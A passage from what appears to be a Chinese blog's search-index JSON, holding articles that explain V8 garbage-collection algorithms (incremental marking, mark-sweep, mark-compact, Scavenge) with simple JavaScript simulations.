从这个对象出发，模拟标记它的引用（通常这会需要判断对象的属性值）</span></span><br><span class=\"line\">    <span class=\"comment\">// 为了简化模型，我们这里忽略对象间的引用关系</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 清除未标记的对象</span></span><br><span class=\"line\">  <span class=\"title function_\">sweep</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span> = <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">obj</span> =&gt;</span> obj.<span class=\"property\">marked</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> objects = [<span class=\"keyword\">new</span> <span class=\"title class_\">HeapObject</span>(<span class=\"string\">'obj1'</span>), <span class=\"keyword\">new</span> <span class=\"title class_\">HeapObject</span>(<span class=\"string\">'obj2'</span>)]; <span class=\"comment\">// 模拟的对象堆</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> gc = <span class=\"keyword\">new</span> <span class=\"title class_\">IncrementalGC</span>(objects);</span><br><span class=\"line\"><span class=\"keyword\">const</span> roots = [objects[<span class=\"number\">0</span>]]; <span class=\"comment\">// 模拟根引用集合</span></span><br><span class=\"line\"></span><br><span class=\"line\">gc.<span class=\"title function_\">initialMark</span>(roots); <span class=\"comment\">// 初始标记阶段</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟运行时环境，逐步完成标记</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> intervalId = <span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  gc.<span class=\"title function_\">incrementallyMark</span>();</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (gc.<span class=\"property\">markQueue</span>.<span class=\"property\">length</span> === <span class=\"number\">0</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">clearInterval</span>(intervalId);</span><br><span class=\"line\">    gc.<span class=\"title function_\">sweep</span>(); <span class=\"comment\">// 清除阶段，这也可以分步进行</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(objects); <span class=\"comment\">// 这里应该只有被标记的objects[0]</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面的代码中，我们定义了 <code>HeapObject</code> 类来表示堆中的对象。我们还定义了一个 <code>IncrementalGC</code> 类，它拥有一系列对象，一个标记队列用于增量标记过程，并实现了 <code>initialMark</code>, <code>incrementallyMark</code>, 和 <code>sweep</code> 方法来执行垃圾回收的各个阶段。</p>\n<p><code>initialMark</code> 方法将模拟根对象直接可达的对象标记为存活，这些对象则被放入 <code>markQueue</code> 中以进行后续的增量标记阶段。</p>\n<p><code>incrementallyMark</code> 方法在特定的时间间隔运行（例如，它可以由 JavaScript 事件循环在其他任务之间定期触发），每次执行时它会处理一部分标记队列。真实的垃圾回收器可能会使用更复杂的方法来确定何时进行增量标记，以及每次应该标记多少对象，但在这个模拟中，我们在每个间隔只处理队列中的一个对象。</p>\n<p><code>processQueue</code> 方法模拟处理标记队列，并将计划标记的对象标记为存活。在这个简化的模型中，我们没有模拟对象引用其他对象的情况，这通常在真实的增量标记中非常重要。</p>\n<p><code>incrementallyMark</code> 方法在标记完所有对象后输出完成标记的消息。随后，清除阶段开始，<code>sweep</code> 方法过滤出所有未标记的对象，模拟了清除这些对象的垃圾回收过程。</p>\n<p>在最后，我们通过 <code>setInterval</code> 函数周期性地调用 <code>incrementallyMark</code> 方法，模仿增量标记中的 “工作时间切片”。一旦所有的标记任务完成，清除 <code>intervalId</code> 定时器，执行 <code>sweep</code> 方法，结束垃圾回收。</p>\n<p>在控制台输出中，我们应该只看到之前被标记为存活的对象，模拟了这些对象是如何被保留下来的，而未标记的对象则被过滤掉，模拟了它们的内存被回收。</p>\n<p>请记住，这只是一个非常基础的模拟，旨在帮助理解增量标记算法的基本思想。真实世界中，垃圾回收器更加复杂，会涉及优化技术、堆内存的结构和管理、对象的分代收集等多个方面，而且通常是由底层语言实现的，并且完全隐藏在 JavaScript 运行时环境中。</p>\n"},{"title":"垃圾回收：标记 - 清除（Mark-Sweep）算法","url":"/browser/v8/MarkSweep.html","content":"<p>标记 - 清除（Mark-Sweep）算法是一种常见的垃圾回收（GC）机制，主要用于自动管理编程语言的内存。这种算法通过两个阶段的操作来回收内存：标记（Mark）阶段和清除（Sweep）阶段。</p>\n<h2 id=\"标记阶段\"><a href=\"#标记阶段\" class=\"headerlink\" title=\"标记阶段\"></a>标记阶段</h2><p>在标记阶段，垃圾回收器遍历所有的活动对象，即那些从根集合（root set，通常包括全局变量、在执行栈上的变量等）可达的对象。遍历的过程中，垃圾回收器 “标记” 这些被访问的对象。标记通常是通过在对象的元数据中设置一个位来完成的，以表示该对象是活动的，不应被回收。</p>\n<h2 id=\"清除阶段\"><a href=\"#清除阶段\" class=\"headerlink\" title=\"清除阶段\"></a>清除阶段</h2><p>标记完成后，清除阶段开始。在清除阶段，垃圾回收器再次遍历堆内存中的所有对象，这次是为了查找未被标记的对象。未被标记的对象被认为是不可达的，即它们不再被程序使用或者无法从根集合访问到。这些未标记的对象随后会被回收，释放它们占用的内存以供程序后续使用。</p>\n<h2 id=\"特点与挑战\"><a href=\"#特点与挑战\" class=\"headerlink\" title=\"特点与挑战\"></a>特点与挑战</h2><p>优点：标记 - 清除算法的主要优点在于它的概念相对简单，可以有效地回收不再被需要的内存空间。与引用计数（另一种内存回收机制）相比，它能够回收循环引用的对象。<br>暂停时间：一个挑战是标记 - 清除算法在执行期间会引起程序的暂停（Stop-The-World），尤其是在较大的堆或者大量存活对象的情况下，这可能导致程序响应性降低。<br>内存碎片：标记 - 清除算法可能会导致内存碎片化，因为它仅仅清除了不可达的对象，没有移动存活的对象。这可能将可用内存分割成小的片段，影响到后续内存分配的效率。</p>\n<h2 id=\"优化\"><a href=\"#优化\" class=\"headerlink\" title=\"优化\"></a>优化</h2><p>为了减少暂停时间和解决内存碎片化问题，现代的垃圾回收器经常结合使用多种策略和算法，如：</p>\n<p>增量标记（Incremental Marking）：将标记阶段分成多个小步骤执行，交替执行程序代码和标记代码，减少长时间的暂停。<br>并发标记（Concurrent Marking）：在程序运行的同时进行标记阶段，通过多线程技术实现。<br>压缩（Compaction）：在清除阶段或之后进行，将存活的对象移动到内存的一端，以此减少内存碎片。</p>\n<h2 id=\"js代码模拟标记-清除（Mark-Sweep）算法\"><a href=\"#js代码模拟标记-清除（Mark-Sweep）算法\" class=\"headerlink\" title=\"js代码模拟标记-清除（Mark-Sweep）算法\"></a>js 代码模拟标记 - 清除（Mark-Sweep）算法</h2><p>要使用 JavaScript 代码模拟标记 - 清除垃圾回收算法，我们需要模拟内存管理和跟踪对象引用。以下是一个简化模拟代码示例，以帮助了解如何实现标记 - 清除算法。</p>\n<p>首先，我们将创建几个类以表示对象、堆和垃圾回收器：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HeapObject</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">marked</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Heap</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span> = [];</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">addObject</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">push</span>(obj);</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">removeObject</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> index = <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">indexOf</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (index !== -<span class=\"number\">1</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">splice</span>(index, <span class=\"number\">1</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GarbageCollector</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">heap</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span> = heap;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Set</span>(); <span class=\"comment\">// 根集合</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟应用程序创建一个对象，并把它添加到根集合中</span></span><br><span class=\"line\">  <span class=\"title function_\">newObject</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> obj = <span class=\"keyword\">new</span> <span class=\"title class_\">HeapObject</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"title function_\">addObject</span>(obj);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">add</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟删除根集合中的引用</span></span><br><span class=\"line\">  <span class=\"title function_\">removeObjectFromRoots</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">delete</span>(obj);</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 标记阶段</span></span><br><span class=\"line\">  <span class=\"title function_\">mark</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">obj</span> =&gt;</span> (obj.<span class=\"property\">marked</span> = <span class=\"literal\">false</span>)); <span class=\"comment\">// 清除旧的标记</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">root</span> =&gt;</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">markFrom</span>(root)); <span class=\"comment\">// 从根集合开始标记</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 从一个对象开始递归地标记所有可达对象（在真实的垃圾回收器中这通常更复杂）</span></span><br><span class=\"line\">  <span class=\"title function_\">markFrom</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!obj.<span class=\"property\">marked</span>) {</span><br><span class=\"line\">      obj.<span class=\"property\">marked</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"comment\">// 如果此对象有引用其他对象，我们需要递归标记</span></span><br><span class=\"line\">      <span class=\"comment\">// 由于我们的模型很简单，这里我们忽略了这一部分</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 清除阶段</span></span><br><span class=\"line\">  <span class=\"title function_\">sweep</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (i &lt; <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"property\">objects</span>.<span class=\"property\">length</span>) {</span><br><span class=\"line\">      <span class=\"keyword\">const</span> obj = <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"property\">objects</span>[i];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!obj.<span class=\"property\">marked</span>) {</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"title function_\">removeObject</span>(obj); <span class=\"comment\">// 清除未标记的对象</span></span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 运行完整的标记-清除过程</span></span><br><span class=\"line\">  <span class=\"title function_\">gc</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">mark</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">sweep</span>();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个模拟堆</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> heap = <span class=\"keyword\">new</span> <span class=\"title class_\">Heap</span>();</span><br><span class=\"line\"><span class=\"comment\">// 创建一个垃圾收集器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> gc = <span class=\"keyword\">new</span> <span class=\"title class_\">GarbageCollector</span>(heap);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟对象的创建和垃圾收集</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj1 = gc.<span class=\"title function_\">newObject</span>(); <span class=\"comment\">// 创建一个新对象</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj2 = gc.<span class=\"title function_\">newObject</span>(); <span class=\"comment\">// 创建另一个新对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">gc.<span class=\"title function_\">removeObjectFromRoots</span>(obj1); <span class=\"comment\">// 移除 obj1 的引用</span></span><br><span class=\"line\">gc.<span class=\"title function_\">gc</span>(); <span class=\"comment\">// 运行垃圾回收</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(heap.<span class=\"property\">objects</span>); <span class=\"comment\">// 只包含 'obj2'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上述模拟示例中，HeapObject 类表示堆中的对象，每个对象都有一个 marked 属性，用于标记阶段。Heap 类模拟堆内存，提供添加和移除对象的方法。GarbageCollector 类是我们的简化垃圾回收器，它使用标记和清除的方法来管理堆内存中的对象。</p>\n<p>在这个模拟中，我们假设所有的对象都是单独的，没有关系或属性连接它们。在现实中，标记过程会递归遍历所有可从根集合到达的对象。同样，这个简化的模型没有考虑对象间的关联或对象的特定数据结构，这些都在真实世界的标记 - 清除垃圾回收算法中非常重要。</p>\n<p>需要注意的是，这个模拟仅用于演示目的，以帮助理解标记 - 清除算法的基本原理，它并不反映实际的 JavaScript 垃圾回收行为。在实际的 JavaScript 引擎中，垃圾回收过程是隐藏在底层的，且具有许多复杂性，包括内存管理、对象追踪和内存分配优化等。</p>\n<p>总之，在这个简易的模拟中，垃圾回收器通过两个阶段进行工作：</p>\n<p>标记（Mark）阶段：垃圾回收器从根集合出发去标记所有可以到达的对象，意味着这些对象目前被程序使用中，所以不应该被清除。</p>\n<p>清除（Sweep）阶段：垃圾回收器遍历堆中所有的对象，检查它们是否被标记。未被标记的对象会在这个阶段被清除收回，因为它们已经不再被程序使用。</p>\n<p>请注意，此模拟中的 GarbageCollector 对象提供了一个手动触发垃圾回收的方法 gc ()，这不是在实际 JavaScript 应用程序中可以做的。真实的 JavaScript 垃圾回收器会根据内存压力和其他启发式算法自动触发垃圾回收。</p>\n<p>此外，为了增加真实感，代码中可能加入对象之间的关联（例如对象属性引用其他对象），从而在标记过程中需要进行递归遍历。由于 JavaScript 的特性和环境限制，这里的模拟只能提供一个原理层面的理解，而不是一个可以实际运行的垃圾回收器。在 JS 中，创建和管理内存是被隐藏起来的，由 JS 引擎自身处理。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>标记 - 清除算法是理解现代垃圾回收器工作原理的基础，而实际的垃圾回收器往往通过结合多种技术来优化性能和减少对程序执行的干扰。</p>\n"},{"title":"垃圾回收：标记 - 整理（Mark-Compact）算法","url":"/browser/v8/MarkCompact.html","content":"<p>标记 - 整理（Mark-Compact）算法，又称为压缩（Compaction）算法，是一种垃圾回收机制，用于解决标记 - 清除算法导致的内存碎片问题。与标记 - 清除算法类似，标记 - 整理算法分为两个阶段：标记阶段和整理阶段。</p>\n<h2 id=\"标记阶段\"><a href=\"#标记阶段\" class=\"headerlink\" title=\"标记阶段\"></a>标记阶段</h2><p>在标记阶段，垃圾回收器遍历所有从根集合可达的对象，并标记这些对象。</p>\n<h2 id=\"整理阶段\"><a href=\"#整理阶段\" class=\"headerlink\" title=\"整理阶段\"></a>整理阶段</h2><p>在整理阶段，垃圾回收器会移动标记为活动的对象，将它们压缩到内存的一端，从而消除碎片并释放出一整块连续的未使用内存。</p>\n<p>标记 - 整理算法的核心优势是它保留了所有存活对象，同时减少了内存碎片。但这个过程的缺点是需要更多的时间，因为移动对象涉及更多的内存操作。</p>\n<p>我们可以用 JavaScript 来模拟标记 - 整理算法的基本步骤，但请注意，这个模拟是为教育目的，并不是实际的垃圾回收器实现。下面是用 JavaScript 来模拟的代码示例：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HeapObject</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">data</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">data</span> = data;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">marked</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">forwardingAddress</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// 用于压缩时的定位</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Heap</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span> = [];</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">addObject</span>(<span class=\"params\">data</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> obj = <span class=\"keyword\">new</span> <span class=\"title class_\">HeapObject</span>(data);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>.<span class=\"title function_\">push</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">compact</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> liveObjects = [];</span><br><span class=\"line\">    <span class=\"keyword\">const</span> deadObjects = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 分离标记为活动和非活动的对象</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> obj <span class=\"keyword\">of</span> <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span>) {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (obj.<span class=\"property\">marked</span>) {</span><br><span class=\"line\">        liveObjects.<span class=\"title function_\">push</span>(obj);</span><br><span class=\"line\">      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        deadObjects.<span class=\"title function_\">push</span>(obj);</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将所有活动对象移动至内存前端，并更新其转发地址</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span> = [];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> obj <span class=\"keyword\">of</span> liveObjects) {</span><br><span class=\"line\">      obj.<span class=\"property\">forwardingAddress</span> = <span class=\"variable language_\">this</span>.<span class=\"title function_\">addObject</span>(obj.<span class=\"property\">data</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 重置标记状态</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> obj <span class=\"keyword\">of</span> liveObjects) {</span><br><span class=\"line\">      obj.<span class=\"property\">marked</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> deadObjects.<span class=\"property\">length</span>; <span class=\"comment\">// 返回清理对象的数量</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GC</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">heap</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span> = heap;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span> = []; <span class=\"comment\">// 根引用数组</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟创建对象</span></span><br><span class=\"line\">  <span class=\"title function_\">createObject</span>(<span class=\"params\">data</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> obj = <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"title function_\">addObject</span>(data);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">push</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟删除根引用</span></span><br><span class=\"line\">  <span class=\"title function_\">deleteObject</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> index = <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">indexOf</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (index !== -<span class=\"number\">1</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>.<span class=\"title function_\">splice</span>(index, <span class=\"number\">1</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 标记阶段</span></span><br><span class=\"line\">  <span class=\"title function_\">mark</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> root <span class=\"keyword\">of</span> <span class=\"variable language_\">this</span>.<span class=\"property\">roots</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">markRecursive</span>(root);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 递归标记方法</span></span><br><span class=\"line\">  <span class=\"title function_\">markRecursive</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!obj.<span class=\"property\">marked</span>) {</span><br><span class=\"line\">      obj.<span class=\"property\">marked</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"comment\">// 如果对象有引用其他对象，递归地标记那些对象</span></span><br><span class=\"line\">      <span class=\"comment\">// 在这个模拟中被忽略了</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 整理并重新分配对象</span></span><br><span class=\"line\">  <span class=\"title function_\">compact</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">heap</span>.<span class=\"title function_\">compact</span>();</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 执行标记-整理垃圾回收</span></span><br><span class=\"line\">  <span class=\"title function_\">collectGarbage</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">mark</span>(); <span class=\"comment\">// 标记阶段</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">compact</span>(); <span class=\"comment\">// 整理阶段</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例使用：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建模拟堆</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> heap = <span class=\"keyword\">new</span> <span class=\"title class_\">Heap</span>();</span><br><span class=\"line\"><span class=\"comment\">// 创建垃圾回收器</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> gc = <span class=\"keyword\">new</span> <span class=\"title function_\">GC</span>(heap);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一些对象</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj1 = gc.<span class=\"title function_\">createObject</span>(<span class=\"string\">'obj1'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> obj2 = gc.<span class=\"title function_\">createObject</span>(<span class=\"string\">'obj2'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> obj3 = gc.<span class=\"title function_\">createObject</span>(<span class=\"string\">'obj3'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 删除一个对象的引用</span></span><br><span class=\"line\">gc.<span class=\"title function_\">deleteObject</span>(obj2);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行垃圾回收</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> collected = gc.<span class=\"title function_\">collectGarbage</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`收集到 <span class=\"subst\">${collected}</span> 个不可达对象。`</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检查堆中剩余的对象</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(heap.<span class=\"property\">objects</span>.<span class=\"title function_\">map</span>(<span class=\"function\"><span class=\"params\">obj</span> =&gt;</span> obj.<span class=\"property\">data</span>)); <span class=\"comment\">// 应该只显示 'obj1' 和 'obj3'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面的示例中，我们定义了三个类：<code>HeapObject</code>、<code>Heap</code> 和 <code>GC</code>。</p>\n<ol>\n<li><code>HeapObject</code> 类代表堆中的对象，包括它的数据、一个标记位（用于标记清除），以及一个转发地址（在整理阶段使用）。</li>\n<li><code>Heap</code> 类代表内存堆，有一个添加对象的方法和一个紧凑（压缩）方法。紧凑方法会将所有标记的对象移动到数组开始的位置，并更新它们的转发地址。</li>\n<li><code>GC</code> 类是模拟垃圾收集器。它可以创建对象、删除对象的根引用、进行标记和整理。标记的递归方法假设对象间没有相互引用。在真实的情况下，这可能涉及到一个复杂的引用图。</li>\n</ol>\n<p>当 <code>collectGarbage</code> 方法被调用时，它首先执行 <code>mark</code> 方法来标记所有可从根对象集合到达的对象。标记完成后，<code>compact</code> 方法会移动所有标记的对象并压缩堆，以减少内存碎片。</p>\n<p>此模拟例示提供了对标记 - 整理（压缩）算法核心工作原理的基本了解。在真正的编程环境中，这个算法的实现细节会非常复杂，且会由底层语言运行时或虚拟机来完成，不会暴露给开发者。</p>\n"},{"title":"垃圾回收：Scavenge 算法","url":"/browser/v8/ScavengeAlgorithm.html","content":"<p>Scavenge 算法是一种特定于垃圾回收（Garbage Collection, GC）技术的算法，主要在一些现代编程语言的运行时环境中被实现，例如在 V8 JavaScript 引擎中。它是一种采用分代回收（Generational Collection）策略的垃圾回收机制的一部分，着重于快速高效地回收年轻代（Young Generation）中的对象。</p>\n<h2 id=\"垃圾回收与分代假说\"><a href=\"#垃圾回收与分代假说\" class=\"headerlink\" title=\"垃圾回收与分代假说\"></a>垃圾回收与分代假说</h2><ul>\n<li>垃圾回收：垃圾回收是自动管理内存的过程，它追踪哪些对象不再被程序需要，并释放这些对象占用的内存。</li>\n<li>分代假说：大多数编程语言的垃圾回收器基于分代假说，这个假说认为大多数对象在内存中存活时间很短，而只有少数对象需要长时间存活。</li>\n</ul>\n<h2 id=\"Scavenge算法主要特点\"><a href=\"#Scavenge算法主要特点\" class=\"headerlink\" title=\"Scavenge算法主要特点\"></a>Scavenge 算法主要特点</h2><ul>\n<li><p>简单高效：Scavenge 